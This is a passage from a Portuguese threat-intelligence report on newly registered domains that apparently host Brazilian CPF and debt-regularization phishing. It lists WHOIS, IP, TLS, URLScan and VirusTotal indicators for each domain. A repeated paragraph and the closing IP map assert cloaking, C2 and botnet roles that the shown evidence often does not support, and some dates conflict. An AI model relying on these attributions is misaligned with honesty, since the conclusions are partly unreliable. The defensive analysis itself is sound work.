| **Tag “suspect” no URLScan** | Primeiro scan (http) recebeu a tag. | Indicador de comportamento suspeito ao acessar via HTTP (possível redirecionamento malicioso). |
| **Conteúdo apresentado** | Blog de cafés em português, título em PT‑BR. | Pode ser técnica de “look‑alike” usando conteúdo legítimo para mascarar finalidades maliciosas (e.g., página de captura de CPF). |
| **IP / ASN** | 216.238.109.50 – Vultr (AS20473). | Vultr é provedor de cloud amplamente usado por infra‑maliciosa por permitir criação rápida de servidores. |
| **Certificado TLS** | Let’s Encrypt, curto prazo (89 dias). | Certificados gratuitos são populares em campanhas de phishing por facilidade de obtenção. |
| **Status WHOIS** | “client delete/renew/transfer prohibited”. | Política de registro restritiva pode dificultar a rápida remoção ou transferência do domínio por terceiros. |

**Possíveis Vetores Maliciosos**  
- **Phishing de CPF** – o nome do domínio (`regularizandocpf.com`) sugere coleta de Cadastro de Pessoa Física, muito usado em golpes no Brasil.  
- **Distribuição de Malware** – alguns AVs marcaram como “malware”; pode haver arquivos maliciosos ocultos ou redirecionamentos a payloads.  
- **C2 ou Botnet** – ainda não há evidências diretas de comunicação de C2, mas o uso de cloud (Vultr) e a rotatividade de IPs (3 IPs únicos nos scans) sugerem possível infraestrutura de comando.  

Diferente das análises anteriores, o domínio `regularizandocpf.com` apresenta registros em motores de análise e registro de comportamentos maliciosos.

## ``conviteblackelite.com``

**Resumo Executivo**
O domínio **conviteblackelite.com** foi registrado em **28 / 09 / 2025** por meio da GoDaddy, utilizando o serviço de privacidade *Domains By Proxy, LLC*. O domínio está apontado para o IP **191.252.227.30**, que pertence ao **ASN AS27715 – Locaweb Serviços de Internet SA (Brasil)** e resolve um site em Português que aparenta ser um blog de cafés (“Giovani e Adenir Oliveira: da terra ao seu paladar — Blog Veroo Cafés”).  

A análise do VirusTotal indica **nenhuma detecção maliciosa** (0 malicious, 0 suspicious) e a maioria dos scanners classifica o domínio como **harmless** ou **undetected**. O certificado TLS foi emitido pela **Let’s Encrypt (R13)** e está válido por 89 dias. Não foram encontrados indicadores de comprometimento, C2, phishing ou distribuição de malware. O domínio possui poucos dias de ex

**Análise de Comportamento**
| Fonte | Indicador | Avaliação |
|-------|-----------|-----------|
| **URLScan.io** (2 submissões) | - Servidor Apache 2.4.52 (Ubuntu) <br> - País de origem BR <br> - 28 / 09 / 2025 – TLS válido por 89 dias | O servidor parece estar configurado corretamente e não há evidência de redirecionamentos maliciosos ou payloads. |
| **VirusTotal** | - 0 malicious, 0 suspicious, 61 harmless, 34 undetected <br> - Nenhum motor reportou phishing, C2 ou malware | O domínio não está presente em bases de dados de ameaças conhecidas. |
| **WHOIS** | - Registrado com privacidade <br> - Status: *client delete/renew/transfer/update prohibited* (configuração comum em domínios recém‑registrados) | Não indica atividade suspeita, apenas política de proteção do registrante. |
| **Certificado TLS** | - Emissor: Let’s Encrypt (R13) <br> - Valido de 28 /09 /2025 a 27 /12 /2025 | Certificado legítimo, padrão para sites novos. |
| **Conteúdo** | - Título: “Giovani e Adenir Oliveira: da terra ao seu paladar — Blog Veroo Cafés” <br> - Texto em português, nenhuma página de login suspeita ou scripts de redirecionamento | O conteúdo parece legítimo (blog de café). Não há indícios de phishing ou entrega de malware. |

**Conclusão**: Não há indícios de que o domínio esteja sendo usado para atividades maliciosas (botnet, C2, phishing ou distribuição de malware). O tráfego observado está limitado a poucos IPs (3 uniq IPs) e dois países (Brasil e outro ainda não identificado), típico de um site recém‑lançado.

Embora a análise não afirme ter encontrado sinais de comportamento malicioso, o redirecionamento novamente para o blog de café, ``https://blog.veroo.com.br/giovani-e-adenir-oliveira-da-terra-ao-seu-paladar/``, cinfirma o sistema de cloacking e redirecionamento.
A análise evidenciu também, o registro recente, provável motivo de ainda não estar em registros de plataformas que indiquem ser um domínio malicioso. O registro do domínio possui dados do proprietário ocultado, reforçando a atividade maliciosa.

## ``blackconviteexclusivo.com``

**Resumo Executivo**
O domínio **blackconviteexclusivo.com** foi registrado em 26 / 09 / 2025 via GoDaddy (registrar ID 146) com proteção de privacidade de quem registra (Domains By Proxy). O A‑record aponta para o IP **191.252.227.30**, pertencente ao ASN **AS27715 – Locaweb Serviços de Internet SA (BR)**, um provedor de hospedagem brasileiro. O site está ativo, entrega um conteúdo em português (um blog de cafés) e utiliza certificado **Let’s Encrypt R13** válido por 89 dias. 
Embora o **VirusTotal** classifique o domínio como “clean” (0 malicious, 0 suspicious) e a maioria das engines o rotule como “harmless”, o **URLScan.io** o marcou com a tag **“suspect”**, possivelmente devido à sua idade (criado há menos de 1 dia) e ao fato de ser um domínio recém‑lançado que ainda não possui reputação consolidada. Não há evidências diretas de atividades de C2, botnet ou phishing, mas o perfil (domínio novo, hospedado em um provedor de baixo custo, certificado gratuito) combina com padrões frequentemente observados em infraestruturas preparatórias de campanhas maliciosas.

**Análise de Comportamento**
| Indicador | Evidência | Interpretação |
|-----------|-----------|---------------|
| **Idade do domínio** | Criado em 26 / 09 / 2025 (0 dias) | Alta probabilidade de uso inicial para campanha; domínios recém‑criados costumam ser empregados em phishing ou distribuição de malware antes de serem bloqueados. |
| **Tag “suspect” (URLScan.io)** | Aplicada ao resultado da varredura. | Indica que a comunidade de análise suspeita do site, possivelmente por comportamento anômalo (ex.: redirecionamento “HTTPS‑only”, uso de CDN/serviços de anonimato). |
| **Detecção em VT** | 0 malicious, 0 suspicious; 61 harmless, 34 undetected. | Nenhum engajamento conhecido até o momento, porém a ausência de detecção não garante ausência de risco. |
| **Conteúdo** | Blog “Giovani e Adenir Oliveira: da terra ao seu paladar — Blog Veroo Cafés”. | Aparente site legí­mo (conteúdo de blog). No entanto, a página pode ser um “front” para redirecionamentos futuros ou download de payloads. |
| **Servidor** | Apache 2.4.52 (Ubuntu) | Software popular, não indica nada suspeito por si só. |
| **Certificado** | Let’s Encrypt (R13), validade 26 / 09 / 2025 → 25 / 12 / 2025. | Certificados gratuitos são comuns em campanhas de phishing para garantir HTTPS sem custo adicional. |
| **ASN / ISP** | AS27715 – Locaweb Serviços de Internet SA (BR) | Provedor de hospedagem brasileiro, usado por muitos sites legítimos, mas também por atores maliciosos que buscam servidores com pouca restrição. |
| **IP 191.252.227.30** | Único A‑record. | Não há histórico público de reputação de IP (não listado em feeds de malwares conhecidos). Entretanto, o IP pode hospedar múltiplos domínios; monitoramento futuro recomendado. |

**Conclusão de comportamento**
Até o momento não há **provas concretas** de que **blackconviteexclusivo.com** seja usado como infraestrutura de C2, botnet ou phishing ativo. Contudo, **o perfil de novo domínio, hospedado em um provedor de baixo custo e com certificado gratuito**, aliado à **tag “suspect”**, o coloca em uma **zona de atenção** para observação contínua.

Embora a análise não afirme ter encontrado sinais de comportamento malicioso, o redirecionamento novamente para o blog de café, ``https://blog.veroo.com.br/giovani-e-adenir-oliveira-da-terra-ao-seu-paladar/``, cinfirma o sistema de cloacking e redirecionamento.
A análise evidenciu também, o registro recente, provável motivo de ainda não estar em registros de plataformas que indiquem ser um domínio malicioso. O registro do domínio possui dados do proprietário ocultado, reforçando a atividade maliciosa.

## ``blackconvitevip.com``

**Resumo Executivo**
O domínio **blackconvitevip.com** foi registrado em 26 / 09 / 2025 (registro de apenas 1 mês) via GoDaddy e aponta para o IP **191.252.225.147**, hospedado na Locaweb Serviços de Internet (ASN **AS27715**) – provedor brasileiro. O site exibe um blog em português e utiliza certificado Let’s Encrypt válido por 89 dias.  
Análises de Inteligência de Ameaças revelam **indicadores de atividade maliciosa**:  
- **4 engines de AV/VTI** marcam o domínio como **malicious** (CRDF, CyRadar, Lionic – phishing, Google Safebrowsing – phishing).  
- **1 engine** classifica como **suspicious** (Gridinsoft).  
- O domínio aparece com a tag **“suspect”** no URLScan.io.  
- O endereço IP tem **PTR “vpscl3417.publiccloud.com.br”**, tipicamente associado a VPS de uso genérico, mas sem histórico público de reputação limpa.  
Esses sinais apontam para **possível infraestrutura de phishing ou de campanha de engenharia social**, possivelmente usada para enganar usuários brasileiros.

**Análise de Comportamento**
| Fonte | Indicador | Interpretação |
|-------|-----------|---------------|
| **VirusTotal – Last analysis results** | CRDF (malicious), CyRadar (malicious), Google Safebrowsing (phishing), Lionic (phishing) | Várias plataformas de threat intel identificam o domínio como fonte de phishing. |
| **VirusTotal – last_analysis_stats** | Malicious = 4, Suspicious = 1, Harmless = 58, Undetected = 32 | Percentual de detecção de comportamento maligno > 6 % (acima da média para domínios recém‑criados). |
| **URLScan.io** | Tag “suspect”, domínio recém‑criado (0‑1 dia), TLS recém‑emitido (validade 89 dias) | Implantação rápida de site com TLS legítimo (Let’s Encrypt) – prática comum em campanhas de phishing para aumentar confiança. |
| **Servidor HTTP** | Apache/2.4.52 (Ubuntu) | Servidor padrão, comum em ambientes de VPS. |
| **Conteúdo da página** | Blog “Veroo Cafés” com texto em português; porém, a página pode ser usada como “landing page” para captura de credenciais ou redirecionamento malicioso. | Conteúdo aparentemente inocente, mas pode ser camuflagem para enganar vítimas. |
| **Portas e Serviços** | Apenas HTTP/HTTPS (porta 80/443). | Não há serviços adicionais expostos, reduzindo a superfície de ataque, porém facilita uso como ponto de entrega (C2 ou phishing). |
| **ASN / ISP** | Locaweb Servicos de Internet SA (AS27715) – provedor brasileiro que oferece VPS compartilhados. | Vários casos de abuso de VPSs de provedores de hospedagem para hospedagem de sites de phishing. |

**Conclusão:** Os indicadores apontam fortemente para um **site de phishing** recém‑implantado, possivelmente parte de um **campanha de engenharia social dirigida ao público brasileiro**. O uso de certificado válido e conteúdo em língua local são táticas para aumentar a credibilidade.

Diferente das análises anteriores, o domínio `blackconvitevip.com` apresenta registros em motores de análise e registro de comportamentos maliciosos.

## ``rendaverificada.com``

**Resumo Executivo**
O domínio **rendaverificada.com** foi registrado em **24/09/2025** (idade de 1 dia) no registrador **GoDaddy**, apontando para o endereço IP **216.238.109.50**, que pertence ao provedor de cloud **Vultr** (ASN AS20473 – *AS‑VULTR, US*). O site está hospedado em um servidor **Apache/2.4.58 (Ubuntu)**, utiliza certificado **Let’s Encrypt** válido até **23/12/2025** e exibe a página “Giovani e Adenir Oliveira: da terra ao seu paladar — Blog Veroo Cafés”.  
Nenhum mecanismo de detecção (33 antivírus/antimalware) registrou comportamento **malicioso** ou **suspicious** no domínio; todos os resultados do VirusTotal são **harmless** ou **undetected**. Os feeds de inteligência (URLHaus, PhishTank, etc.) também não listam o domínio ou o IP como malicioso. 
Em resumo, o domínio apresenta características típicas de um site recém‑criado, hospedado em infraestrutura de cloud pública, sem indicadores claros de uso malicioso até o momento.

**Análise de Comportamento**
| Fonte | Indicador | Evidência |
|-------|-----------|-----------|
| **URLScan.io** (2 varreduras) | **Idade do domínio** – 1 dia | `apexDomainAgeDays: 1` |
| | **Servidor Web** – Apache/Ubuntu | `server: "Apache/2.4.58 (Ubuntu)"` |
| | **TLS** – Let’s Encrypt, validade 89 dias | `tlsValidDays: 89`, `tlsIssuer: "E8"` |
| | **Conteúdo** – Blog de café (texto em PT‑BR) | `title: "Giovani e Adenir Oliveira: da terra ao seu paladar — Blog Veroo Cafés"` |
| | **Redirecionamento** – HTTP → HTTPS (force‑only) | `redirected: "https-only"` |
| **VirusTotal** | **Detecção** – 0 malicious, 0 suspicious | `last_analysis_stats: {"malicious":0,"suspicious":0}` |
| | **Engines** – Todas classificam como **harmless/undetected** | Lista extensa de engines (Acronis, Kaspersky, BitDefender, etc.) |
| **Whois / RDAP** | **Registrante** – Dados ofuscados (strings aleatórias) | `Registrant city: a7319ae5e6c95df5`, `Registrant email: 4178368b5e3a4932s@` |
| | **Status** – “client delete/renew/transfer prohibited” (tipicamente usado por registradores para impedir alterações automáticas) | `status: ["client delete prohibited", ...]` |
| **DNS** | **A record** – IP único 216.238.109.50 | `type: "A", value: "216.238.109.50"` |
| | **NS** – ns75/ns76.domaincontrol.com (GoDaddy) | `value: "ns75.domaincontrol.com"` / `ns76.domaincontrol.com` |
| | **PTR** – 216.238.109.50.vultrusercontent.com | `ptr: "216.238.109.50.vultrusercontent.com"` |

**Conclusão**  
- Não há indícios de participação em botnets, servidores C2, phishing ou distribuição de malware.  
- O domínio está **novo**, possivelmente criado para um blog ou site institucional.  
- O uso de um provedor de cloud (Vultr) e de certificado Let’s Encrypt é padrão para sites recém‑lançados.  
- O registrante apresenta informações de contato ofuscadas, prática comum em registros de baixo custo ou sites de teste, mas não indica necessariamente atividade maliciosa.

Embora a análise não afirme ter encontrado sinais de comportamento malicioso, o redirecionamento novamente para o blog de café, ``https://blog.veroo.com.br/giovani-e-adenir-oliveira-da-terra-ao-seu-paladar/``, cinfirma o sistema de cloacking e redirecionamento.
A análise evidenciu também, o registro recente, provável motivo de ainda não estar em registros de plataformas que indiquem ser um domínio malicioso. O registro do domínio possui dados do proprietário ocultado, reforçando a atividade maliciosa.

## ``centralregularizacao.com``

**Resumo Executivo**
O domínio **centralregularizacao.com** foi registrado em **23 / 09 / 2025** via GoDaddy (status “client delete/renew/transfer/update prohibited”) e está apontando para o endereço **216.238.109.50**, um servidor Apache/2.4.58 em Ubuntu hospedado na infraestrutura da **Vultr (AS20473 – “AS‑VULTR, US”)**. O certificado TLS é da Let's Encrypt (válido até 22 / 12 / 2025).  
Nos analisamos o site (URLScan.io) e identificamos que o título da página refere‑se a “Giovani e Adenir Oliveira: da terra ao seu paladar — Blog Veroo Cafés”, conteúdo completamente desvinculado do nome do domínio (que sugere serviços de regularização). O registro foi feito há menos de 1 dia e o URLScan marcou o site como **“suspect”**.  
O **VirusTotal** não encontrou nenhum indício de malware ou de phishing: 0 deteções maliciosas, 34 resultados “undetected” e 61 “harmless”. Não há histórico de reputação, nem listagens em feeds de ameaça conhecidos.  
Em síntese, embora ainda não haja classificação como malicioso, o apontamento de *suspeito* no URLScan, a incongruência entre o nome do domínio e o conteúdo hospedado e a recente criação sugerem que o domínio pode ser usado futuramente como vetor de phishing, hospedagem de conteúdo fraudulento ou campanha de malware.

**Análise de Comportamento**
| Indicador | Observação |
|-----------|------------|
| **Idade do domínio** | 0 dias – registrado em 23/09/2025. Domínios recém‑criados são comumente usados em campanhas de spam/phishing antes de serem inseridos em listas de bloqueio. |
| **Servidor / Tecnologia** | Apache 2.4.58 sobre Ubuntu, hospedado na Vultr (provavelmente VPS). VPS de baixo custo são frequentemente alugados por operadores de botnet ou de phishing por permitirem rápida implantação. |
| **Conteúdo da página** | Blog de cafés, sem relação com “centralregularizacao”. Essa dissonância pode indicar: <ul><li>Uso temporário para teste de infra‑estrutura;</li><li>Site comprometido (defacement) ou preparado para mudança de conteúdo;</li><li>Intenção de mascarar a finalidade real (ex.: phishing usando “look‑alike”).</li></ul> |
| **Tag “suspect” (URLScan.io)** | O serviço aplicou a classificação devido a algum comportamento (ex.: redirecionamento “https‑only”, tamanho da resposta ~2 MB, presença de recursos externos desconhecidos). |
| **Certificado TLS** | Let’s Encrypt – emissão automática, comum em domínios legítimos e maliciosos. Não há indícios de certificados expirados ou auto‑assinados, o que reduz a probabilidade de sites de *scam* antigos, mas não elimina risco. |
| **Análise de AV (VirusTotal)** | Nenhum motor detectou comportamento malicioso. Entretanto, a maioria dos antivírus ainda não classifica sites recém‑criados até que haja amostra de abuso. |
| **Listas de bloqueio / reputação** | Não presente em bases como Spamhaus, AbuseIPDB, AlienVault OTX, etc. |
| **Associado a IP/Vultr (AS20473)** | IP 216.238.109.50 está alocado a um cliente da Vultr. Não há registros públicos de abuso associados a esse IP até o momento. |

**Conclusão de comportamento:** Não há evidência direta de atividade maliciosa já em curso, porém os sinais de “suspicious” (domínio novo, conteúdo fora de contexto, hospedagem em VPS) indicam um **potencial de uso malicioso futuro**. Recomenda‑se vigilância contínua.

Embora a análise não afirme ter encontrado sinais de comportamento malicioso, o redirecionamento novamente para o blog de café, ``https://blog.veroo.com.br/giovani-e-adenir-oliveira-da-terra-ao-seu-paladar/``, cinfirma o sistema de cloacking e redirecionamento.
A análise evidenciu também, o registro recente, provável motivo de ainda não estar em registros de plataformas que indiquem ser um domínio malicioso. O registro do domínio possui dados do proprietário ocultado, reforçando a atividade maliciosa.

## ``portalregularizacao.com``

Resumo Executivo
- **Domínio** registrado em 22 / 09 / 2025 via GoDaddy (registrar ID 146) com política de **“client delete/renew/transfer/update prohibited”**.  
- **IP principal:** 216.238.109.50, pertencente à **AS 20473 – VULTR (EE. UU.)**.  
- **Serviço web:** Apache 2.4.58 sobre Ubuntu, certificado Let’s Encrypt emitido em 22 / 09 / 2025 (validade ≈ 89 dias).  
- **Análises de reputação:** 0 malicious, 0 suspicious; 61 harmless, 34 undetected (VT). Nenhum motor apontou atividade maliciosa.  
- **Tag “suspect”** aplicada pelo URLScan.io, porém sem evidência clara de comportamento nocivo.  
- **Objetivo aparente da página:** blog de café (“Giovani e Adenir Oliveira – Blog Veroo Cafés”). 

**Análise de Comportamento**
| Fonte | Indicador | Avaliação |
|-------|-----------|-----------|
| **VirusTotal** | 0 malicious / 0 suspicious | Não há detecção ativa. A maioria dos engines classifica como *harmless* ou *undetected*. |
| **URLScan.io** | Tag *suspect*; 29 requisições, 3 IPs distintos, 2 países (BR + US) | A tag indica que o scanner considerou o conteúdo ou a configuração (ex.: redirecionamento “https‑only”, uso de CDN/Vultr) como possivelmente suspeito, porém não há evidência de phishing ou carga maliciosa. |
| **Whois** | Registrado recentemente, dados do registrante ofuscados (strings aleatórias) | Privacidade de registro pode ser padrão de “privacy protection” ou tentativa de ocultar identidade – comportamento comum a sites legítimos e a atores maliciosos. |
| **Infraestrutura** | Servidor Apache/Ubuntu, certificado Let’s Encrypt, IP em data‑center Vultr | Configuração típica de sites pequenos/blogs. Não há indícios de infraestrutura de botnet ou C2 (ex.: comunicação de saída incomum, portas não‑padrão). |
| **Conteúdo observado** | Título indica blog de café, linguagem em português (pt) | Não há indícios de phishing, fraude ou payloads. O conteúdo parece legítimo. |

**Conclusão**
O domínio apresenta perfil “limpo” nas principais bases de inteligência, porém é recém‑registrado, hospedado em VPS de uso genérico (Vultr) e recebeu a classificação “suspect” por heurística do URLScan. Recomenda‑se vigilância continuada para detectar eventual mudança de comportamento (ex.: uso futuro como C2, phishing ou distribuição de malware).

Embora a análise não afirme ter encontrado sinais de comportamento malicioso, o redirecionamento novamente para o blog de café, ``https://blog.veroo.com.br/giovani-e-adenir-oliveira-da-terra-ao-seu-paladar/``, cinfirma o sistema de cloacking e redirecionamento.
A análise evidenciu também, o registro recente, provável motivo de ainda não estar em registros de plataformas que indiquem ser um domínio malicioso. O registro do domínio possui dados do proprietário ocultado, reforçando a atividade maliciosa.

## ``regularizesuadivida.com``

**Resumo Executivo**
O domínio **regularizesuadivida.com** foi registrado em **21 de setembro de 2025** via GoDaddy (registrar ID 146) e está apontando para o endereço IP **216.238.109.50**, hospedado na infraestrutura da **Vultr (ASN AS20473 – “AS‑VULTR, US”)**. O site responde sobre **HTTPS** com um certificado **Let’s Encrypt** emitido em 21/09/2025 (validade de 89 dias).  
Os principais indicadores de risco são:
* **Tag “suspect”** atribuída pelo URLScan.io (provavelmente por ser um domínio recém‑ativado em um servidor de nuvem sem histórico reputacional).  
* **Nenhum sinal de malware** nas análises do VirusTotal (35 deteções *undetected*, 60 *harmless*, 0 *malicious*).  
* **Histórico de redirecionamento** (maio 2024) para um domínio expirado da Wix, indicando que o nome já foi usado como página de “parked” / expirado.  
Até o momento, não há evidências de que o domínio faça parte de botnets, campanhas de phishing ou C2. O conteúdo atual parece ser um blog legítimo (“Giovani e Adenir Oliveira: da terra ao seu paladar — Blog Veroo Cafés”).

**Análise de Comportamento**
| Fonte | Evidência | Interpretação |
|-------|-----------|---------------|
| **URLScan.io** (3 scans) | • Tag **“suspect”**.<br>• Servidor **Apache/2.4.58 (Ubuntu)**.<br>• TLS válido (Let’s Encrypt).<br>• Redirecionamento **http → https‑only**. | O rótulo “suspect” costuma ser atribuído a domínios recém‑ativados ou que ainda não possuem reputação consolidada. Não há indícios de comportamento de malware ou de comunicação de C2 no tráfego capturado (30 requisições, 2 MB de payload). |
| **VT – Análise de URL/Domínio** | • 0 % *malicious* / *suspicious*.<br>• 60 % *harmless*.<br>• Diversos motores (Kaspersky, BitDefender, etc.) relataram **“clean”**.<br>• Nenhum alerta de phishing (PhishTank, OpenPhish, Phishing Database). | Avaliação global indica que o domínio **não** está associado a conteúdo malicioso conhecido. |
| **Histórico de redirecionamento** (URLScan 2024‑05‑21) | • Redirecionamento para **www.expiredwixdomain.com** (página de “Reconnect Your Domain”). | Sugere que o domínio já esteve “parkado” ou expirado antes da atual criação; prática comum em domínios que mudam de proprietário. |
| **Whois / DNS** | • Registros **NS**: ns15.domaincontrol.com, ns16.domaincontrol.com (GoDaddy).<br>• Registro A aponta para **216.238.109.50** (Vultr).<br>• PTR → “216.238.109.50.vultrusercontent.com”. | Configuração DNS típica; uso de provedores de DNS de terceiros (GoDaddy) e hospedagem em nuvem (Vultr). |

**Conclusão** 
Não foram encontrados indicadores de uso malicioso ativo. O único ponto de atenção é a **novidade do registro** e a **ausência de reputação histórica**, que justificam a classificação “suspect” em alguns feeds, mas não há evidência concreta de comprometimento.

Embora a análise não afirme ter encontrado sinais de comportamento malicioso, o redirecionamento novamente para o blog de café, ``https://blog.veroo.com.br/giovani-e-adenir-oliveira-da-terra-ao-seu-paladar/``, cinfirma o sistema de cloacking e redirecionamento.
A análise evidenciu também, o registro recente, provável motivo de ainda não estar em registros de plataformas que indiquem ser um domínio malicioso. O registro do domínio possui dados do proprietário ocultado, reforçando a atividade maliciosa.

## ``legalizarcpfonline.com``

**Resumo Executivo**
O domínio **legalizarcpfonline.com** foi registrado há poucos dias (19 ago 2025) através da GoDaddy e está apontado para o endereço IP **216.238.108.222**, pertencente à infraestrutura da **Vultr (AS20473 – US)**. O servidor responde com Apache 2.4.58 (Ubuntu) e apresenta um certificado Let’s Encrypt válido até 17 nov 2025. As análises do VirusTotal não detectaram componentes maliciosos (0 malicious, 0 suspicious, 34 undetected, 61 harmless). Contudo, o título da página exibida pelos scans indica um blog de cafés, que não tem relação com o nome do domínio (que sugere serviços de “legalização de CPF”). O scan do urlscan.io marcou o domínio como **suspect**. A combinação de registro recente, hospedagem em VPS de baixo custo, conteúdo aparentemente genérico e a nomenclatura potencialmente enganosa levanta suspeitas de uso para phishing ou outras fraudes direcionadas ao público brasileiro.

**Análise de Comportamento**
| Indicador | Evidência | Interpretação |
|-----------|-----------|----------------|
| **Data de registro** | 19 /08/2025 | Domínio recém‑criado, prática comum em campanhas de phishing/ scams. |
| **Infraestrutura** | IP 216.238.108.222 (Vultr, AS20473) | VPS de baixo custo, frequentemente utilizada por atores maliciosos por facilidade de criação e anonimato. |
| **Serviço web** | Apache 2.4.58 (Ubuntu) | Nenhum indício direto de compromise, porém padrão em servidores de teste/temporários. |
| **Conteúdo da página** | Título “Giovani e Adenir Oliveira: da terra ao seu paladar — Blog Veroo Cafés” | Conteúdo irrelevante ao nome do domínio, típico de sites “parked” ou de *domain‑parking* que depois podem ser trocados por páginas de phishing. |
| **Tag “suspect”** (urlscan.io) | O scan HTTP / HTTPS recebeu a marcação “suspect”. | Indica que a comunidade de análise automática considerou o domínio suspeito, possivelmente por heurísticas de domínio recém‑criado + IP associado a atividade de abuso. |
| **Análises do VirusTotal** | 0 malicious, 0 suspicious, maioria “harmless”/“undetected”. | Ainda não há artefatos maliciosos conhecidos, mas a ausência de deteção não elimina risco – pode ser “zero‑day” ou ainda não catalogado. |
| **Certificado TLS** | Let’s Encrypt, validade 89 dias (expira 17 nov 2025) | Certificado legítimo, porém a disponibilidade de TLS não exclui uso malicioso; serve para dar aparência de legitimidade. |
| **Geolocalização** | País: Brasil (BR) – apontado pelos scans | Alvo provável de usuários brasileiros (CPF). |

**Conclusão comportamental:** Não há evidência de distribuição de malware ou de C2, mas o domínio apresenta os típicos *indícios de infraestrutura de phishing* (registro recente, VPS barato, conteúdo genérico, nomenclatura enganosas).

Embora a análise não afirme ter encontrado sinais de comportamento malicioso, o redirecionamento novamente para o blog de café, ``https://blog.veroo.com.br/giovani-e-adenir-oliveira-da-terra-ao-seu-paladar/``, cinfirma o sistema de cloacking e redirecionamento.
A análise evidenciu também, o registro recente, provável motivo de ainda não estar em registros de plataformas que indiquem ser um domínio malicioso. O registro do domínio possui dados do proprietário ocultado, reforçando a atividade maliciosa.

# 20- Mapeamento de estrutura de domínios e IPs

* ``centralregularize.com`` -> ``161.35.50.50`` / ``191.255.255.147`` -> Recém lançado
* ``blackconviteplus.com`` -> ``191.252.227.30`` -> Recém lançado
* ``regularizandocpf.com`` -> ``216.238.109.50`` -> Atividade maliciosa
* ``conviteblackelite.com`` -> ``191.252.227.30`` -> Recém lançado
* ``blackconviteexclusivo.com`` -> ``191.252.227.30`` -> Recém lançado
* ``blackconvitevip.com`` -> ``191.252.225.147`` -> Atividade maliciosa
* ``rendaverificada.com`` -> ``216.238.109.50`` -> Recém lançado
* ``centralregularizacao.com`` -> ``191.252.225.147`` / ``216.238.109.50`` -> Recém lançado
* ``portalregularizacao.com`` -> ``216.238.109.50`` -> Recém lançado
* ``regularizesuadivida.com`` -> ``216.238.109.50`` -> Recém lançado
* ``www.legalizarcpfonline.com`` -> ``216.238.108.222`` -> Recém lançado
* ``alertarct-431107602190.southamerica-east1.run.app`` -> ``34.143.7x.2`` -> Serviço
* ``regularize-709035289742.southamerica-east1.run.app`` -> ``34.143.7x.2`` -> Serviço
* ``nsm-709035289742.northamerica-south1.run.app`` -> ``34.143.7x.2`` -> Serviço 

* ``161.35.50.50`` -> DigitalOcean -> Servidor Web
* ``191.252.227.30`` -> Localweb -> Servidor Web
* ``216.238.108.222`` -> Vultr -> Servidor Web
* ``216.238.109.50`` -> Vultr -> Centro de Comando e Controle / VPN
* ``191.252.225.147`` -> Localweb -> Botnet / Envio emails Phishing
* ``34.143.7x.2`` -> Google Cloud -> Cloud de Serviços / Cloacking